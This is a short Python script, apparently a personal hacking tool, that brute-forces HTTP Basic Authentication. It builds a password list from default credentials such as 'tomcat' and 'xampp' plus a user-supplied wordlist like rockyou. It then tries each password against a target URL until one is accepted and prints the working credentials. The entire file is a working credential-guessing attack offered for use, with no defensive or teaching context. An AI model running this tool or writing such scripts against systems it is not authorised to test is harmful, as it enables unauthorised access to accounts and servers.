#!/bin/python3

import sys,requests,base64
from termcolor import colored

print("="*100)
print("  elbee's Dictionary Attack Tool for HTTP Authentication  ")
print("="*100)

#Usuage: ./tool dir username passlist
if len(sys.argv) < 3:
	print(colored('Invalid arguments specified!','red'))
	print("Usuage: python3 http_auth_force.py <url> <username> <wordlist>")
else:
	try:
		
		user=str(sys.argv[2])
		url=str(sys.argv[1])
		print(colored('Targetting '+url+' as '+user+'...','green'))
		passwds=["jigsaw","xampp","tomcat","s3cr3t","manager"]
		try:
			dir=str(sys.argv[3])
			print(colored('Looking for wordlist..'+dir,'blue'))
			list=open(dir, "rb")
			print(colored('Reading lines in '+dir+'(this will take a bit if you used rockyou)', 'blue'))
			wordlist=list.readlines()
			for line in wordlist:
				foo=str(line)
				passwds.append(foo[2:-3])
		except:
			print(colored('Error, did you specify your wordlist correctly?','red'))
		print(colored('Wordlist constructed successfully! Attacking!','green'))
		r = requests.get(url)
		if r.status_code != 401:
			print(colored('Specified url not using HTTP auth!','red'))
		else:
			#print(r.content)
			for vec in passwds:
				foobar=user+":"+vec
				foobar=base64.b64encode(foobar.encode('utf-8'));foobar=str(foobar);foobar=foobar[2:-1];foobar='Basic '+foobar
				headers = {'Authorization': foobar}
				a = requests.get(url, headers=headers)
				if b"Unauthorized" in a.content:
					pass
				else:
					print("="*80)
					print(colored("VALID CREDS FOUND FOR USER "+user+"! Password is "+str(vec),"green"))
					print("="*80)
					sys.exit()
	except:
		print(colored('Exitting..','red'))
